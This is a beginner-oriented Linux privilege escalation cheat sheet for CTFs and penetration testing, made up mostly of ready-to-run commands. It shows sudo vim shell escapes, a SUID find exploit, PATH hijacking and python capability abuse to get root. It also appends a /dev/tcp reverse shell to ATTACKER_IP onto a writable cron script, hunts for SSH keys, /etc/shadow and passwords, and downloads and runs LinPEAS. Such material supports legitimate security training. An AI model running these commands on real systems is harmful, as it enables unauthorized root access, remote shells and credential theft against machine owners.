# 🐧 Linux Privilege Escalation Guide (Beginner → Advanced)

---

# 📌 What is Privilege Escalation?

Privilege Escalation = gaining higher permissions on a system
👉 Example: user → root

---

# 🚀 Initial Enumeration (VERY IMPORTANT)

## 🔍 Check current user

```bash id="k1c1x2"
whoami
```

## 🔍 Check system info

```bash id="o8p2g7"
uname -a
cat /etc/os-release
```

---

# 📡 Check Network

```bash id="q7x2m1"
ip a
netstat -tulnp
```

---

# 📂 Check users

```bash id="t9f2d3"
cat /etc/passwd
```

---

# 🔑 Check sudo permissions

```bash id="z8p3k9"
sudo -l
```

---

# ❌ Error:

```bash id="l2a9f1"
[sudo] password for user:
```

## Fix:

👉 Try common passwords / check config files / reuse creds

---

# 🔥 SUDO Exploitation

## If allowed:

```bash id="x3c7m2"
sudo vim
```

Inside vim:

```bash id="u7b1n9"
:!bash
```

👉 You get root shell

---

# 📂 SUID Files (IMPORTANT)

## 🔍 Find SUID files

```bash id="v5z8r3"
find / -perm -4000 2>/dev/null
```

---

## 🔥 Exploit Example (find)

```bash id="c2r9d1"
find . -exec /bin/sh \; -quit
```

---

# 📚 GTFOBins

👉 Use: https://gtfobins.github.io
Search binary → get exploit

---

# 🌍 Writable Files

## 🔍 Find writable files

```bash id="y8g6t2"
find / -writable -type f 2>/dev/null
```

---

# 🔍 Writable directories

```bash id="b3m9p4"
find / -writable -type d 2>/dev/null
```

---

# 🔥 PATH Exploitation

## 🔍 Check PATH

```bash id="r6j4x8"
echo $PATH
```

---

## Exploit:

```bash id="f9v2c7"
echo "/bin/bash" > ls
chmod +x ls
export PATH=.:$PATH
sudo some_command
```

---

# 🧠 Cron Jobs

## 🔍 Check cron jobs

```bash id="p1t5k3"
cat /etc/crontab
```

---

## 🔥 Exploit:

If script is writable:

```bash id="n7c2d9"
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> script.sh
```

---

# 📦 Capabilities

## 🔍 Check capabilities

```bash id="k4p7m1"
getcap -r / 2>/dev/null
```

---

## 🔥 Example:

```bash id="g8d3s2"
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# 🧪 NFS Exploitation

## 🔍 Check mounts

```bash id="w2x8f6"
mount
```

---

# 🔑 SSH Keys

## 🔍 Find keys

```bash id="h5z7q1"
find / -name "id_rsa" 2>/dev/null
```

---

# 🔍 Check permissions

```bash id="c9r4m8"
ls -la ~/.ssh
```

---

# 📂 Interesting Files

```bash id="d2v6n3"
/etc/passwd
/etc/shadow
/var/www/
/home/
```

---

# 🔐 Password Hunting

```bash id="u8y3k5"
grep -r "password" / 2>/dev/null
```

---

# 🧠 LinPEAS (Automation)

## Download:

```bash id="m3k7p2"
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

## Run:

```bash id="x6p9d4"
chmod +x linpeas.sh
./linpeas.sh
```

---

# ❌ Error:

```bash id="j4v8t2"
Permission denied
```

## Fix:

```bash id="n8x3c5"
chmod +x file.sh
```

---

# 🔥 Full CTF Workflow

## Step 1: Enumeration

```bash id="q5z2m8"
whoami
sudo -l
find / -perm -4000 2>/dev/null
```

---

## Step 2: Check writable

```bash id="t7y1r3"
find / -writable 2>/dev/null
```

---

## Step 3: Exploit

* SUID
* Sudo
* Cron
* PATH

---

# ⚡ Pro Tips

* Always run:

```bash id="r9w6b2"
sudo -l
```

* Check:

  * SUID
  * Writable files
  * Cron jobs

---

# ⚠️ Legal Disclaimer

Use only on systems you have permission to test.

---

# 🎯 Conclusion

Privilege Escalation is key for:

* CTFs
* Penetration Testing
* Bug Bounty

---

🔥 Keep Practicing!
